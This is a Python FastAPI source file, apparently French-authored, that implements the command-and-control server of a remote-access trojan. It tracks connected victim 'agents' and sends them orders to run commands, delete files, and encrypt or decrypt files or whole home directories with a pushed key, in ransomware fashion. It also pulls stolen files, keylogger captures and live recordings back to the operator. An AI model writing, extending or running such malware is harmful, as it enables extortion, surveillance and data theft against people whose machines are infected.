from fastapi import FastAPI, WebSocket, WebSocketDisconnect
import asyncio
from aff import smooth,titre,clear
from os_nav import create_key, get_key,convert
from colorama import Fore,Style,init
import base64
import subprocess
from pathlib import Path
init(autoreset=True)

app = FastAPI()

class Manager:
    def __init__(self):
        self.client: dict[int,WebSocket] = {}
        self.rep: dict[int,asyncio.Queue] = {}
        self.next_id: int = 0

    async def connect(self,ws: WebSocket) -> int:
        await ws.accept()
        client_id = self.next_id
        self.client[client_id] = ws
        self.rep[client_id] = asyncio.Queue()
        self.next_id +=1
        await smooth(f"[NEW CIBLE]--[ID]--[{client_id}]\n",color="green")
        return client_id

    async def disconnect(self,client_id: int):
        self.client.pop(client_id,None)
        self.rep.pop(client_id,None)
        await smooth(f"[DISC]---[ID]-[{client_id}]\n",color="yellow")

    async def send_to(self,client_id:int,msg,time_out=5):
        ws = self.client.get(client_id)
        if not ws: return None
        await ws.send_json(msg)
        try:
            rep = await asyncio.wait_for(self.rep[client_id].get(),time_out)
            return rep
        except asyncio.TimeoutError:
            await smooth("[ID ERROR]\n",color="red")
            return None

def payload(type_cmd, agent_id, cmd):
    return {"type": type_cmd, "id": int(agent_id), "cmd": cmd}

selected_id = None
async def decoupe():
    global selected_id
    prompt = f"{Fore.RED}[-CMD-]-->: " if selected_id is None else f"{Fore.RED}[AGENT][{selected_id}]>>{Style.RESET_ALL} "
    enter = await asyncio.to_thread(input, prompt)
    if not enter.strip(): return None
    part = enter.split()
    if part[0] == "use":
        selected_id = int(part[1])
        print(f"[*] id selectionné: {selected_id}")
        return None
    if part[0] == "back":
        selected_id = None
        return None
    if selected_id is not None:
        return payload(part[0], selected_id, part[1:])
    else:
        if len(part) < 3:
            print("format: <type> <id> <cmd> ou use <id>")
            return None
        return payload(part[0], int(part[1]), part[2:])

mg = Manager()

@app.websocket("/ws/gan")
async def GAN(ws: WebSocket):
    cl = await mg.connect(ws)
    try:
        while True:
            data = await ws.receive_json()
            if "file_name" in data and "result" in data:
                file_name = data.get("file_name")
                convert(file_name, data.get("result"), _id=cl)
                print(f"\n[+] Fichier multimédia reçu de l'agent [{cl}] -> Sauvegardé : {file_name}")
                continue
            await mg.rep[cl].put(data)
    except WebSocketDisconnect:
        await mg.disconnect(cl)
tp_l = ["--cmd","--rm","--cf","--enc","--run","--stk","--sf","--live","--cec","--view"]
run_type = ["-offall", "-offhome"]
@app.on_event("startup")
async def start():
    await titre(" GAN") # banner une seule fois ici
    async def loop():
        while True:
            ms = await decoupe()
            if not ms: continue
            tp = ms.get("type")
            if tp not in tp_l:
                print("type inconu")
                continue
            elif tp  == "--enc":
                cmd = ms.get("cmd")
                if len(cmd) < 3:
                    return
                create_key()
                file_cible = cmd[0]
                file_key = cmd[1]
                key = get_key(file_key)
                b64 = base64.b64encode(key).decode()
                o = ["enc","dec"]
                tpc = cmd[2]
                if tpc not in o:
                    print("--enc <file> <file_key> <enc or dec>")
                    return None

                data = {"type":"enc","tpc":tpc,"file":file_cible,"key":b64}
                rep = await mg.send_to(ms["id"],data)
                print(rep["result"])
            elif tp == "--rm":
                cmd = ms.get("cmd")
                if len(cmd) < 3:
                    print("cmd need 3 args")
                    return None
                file = cmd[0] 
                data = {"type": "rm","file": file}
                rep = await mg.send_to(ms["id"],data)
                print(rep["result"])
            elif tp == "--run":
                cmd = ms.get("cmd")
                if len(cmd) < 3:
                    print("errorr:-> try: --run <-offall/-offhome> <file.key> <enc/dec>")
                    return
                run_t = cmd[0]
                key_ = cmd[1]
                key = get_key(key_)
                b64 = base64.b64encode(key).decode()
                ofh = ["enc","dec"]
                ofh_t = cmd[2]
                if ofh_t not in ofh:
                    print("enc ou dec doit etre le type d'ordre")
                    return
                
                if run_t not in run_type:
                    await smooth("le types doit etre -offall ou -offhome")
                    return
                if run_t == "-offall":
                    data = {"type": "ofa","key": b64}
                    rep = await mg.send_to(ms["id"],data)
                    print(rep["result"])
                elif run_t == "-offhome":
                    if ofh_t == "enc":
                        data = {"type": "ofh","key":b64,"ofh_t": ofh_t}
                        rep = await mg.send_to(ms["id"],data,time_out=3600)
                        print(rep["result"])
                    elif ofh_t == "dec":
                        data = {"type":"ofh","key":b64,"ofh_t": ofh_t}
                        rep =await mg.send_to(ms["id"],data,time_out=3600)
                        print(rep["result"])
                    else:
                        print("comande inconu")


                    
            elif tp == "--sf":
                if len(cmd) == 0:
                    print("filename please")
                    return
                file_name = cmd[0]
                rep = await mg.send_to(ms["id"],{"type":"sf","file":file_name})
                if rep:
                    convert(file_name,rep["result"],_id=ms["id"])
                    print(rep)
            elif tp == "--stk":
                cmd = ms.get("cmd")
                if len(cmd) == 0:
                    print("not cmd")
                    return
                if cmd[0] != "k":
                    print("cmd[0] k ok?")
                    return
                data = {"type": "stk"}
                rep = await mg.send_to(ms["id"],data)
                if rep:
                    file_name = rep.get("file_name")
                    convert(file_name,rep.get("result"),_id=ms["id"])
            elif tp == "--live":
                cmd = ms.get("cmd")
                dure = int(cmd[0]) if cmd else 10
                data = {"type": "live", "dure": dure}
                rep = await mg.send_to(ms["id"], data, time_out=3)
                print("[*] Ordre '--live' transmis à l'agent. En attente de la réception du fichier en arrière-plan...")
            elif tp == "--cec":
                data = {"type":"cec"}
                cmd = ms.get("cmd")
                if cmd[0] != "str":
                    print("il manque str")
                    continue
                res =await mg.send_to(ms["id"],data)
                print(res.get("error"))
            elif tp == "--view":
                cmd = ms.get("cmd")
                if not cmd:
                    print("cmd not defined")
                    return
                file_name = cmd[0]
                p = Path(file_name)
                if not p.exists() or not p.is_file():
                    print("file not found")
                    return
                ext = p.suffix.lower().split(".")
                img = ["jpg","png","jpeg","gif","webp"]
                try:
                    if ext == "mp4":
                        subprocess.run(["mpv","--vo=kitty",str(p)])
                    elif ext == "mp3":
                        subprocess.run(["mpv","--vo=kitty",str(p)])
                    elif ext in img:
                        subprocess.run(["chafa",str(p)])
                    else:
                        print("Je peux pas ouvrir ce fichier, Mr Ghost,namaster")
                except Exception as e:
                    print(e)

            else:
                rep = await mg.send_to(ms["id"], ms)
                if rep:
                    print(rep.get("result"))
    asyncio.create_task(loop())

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
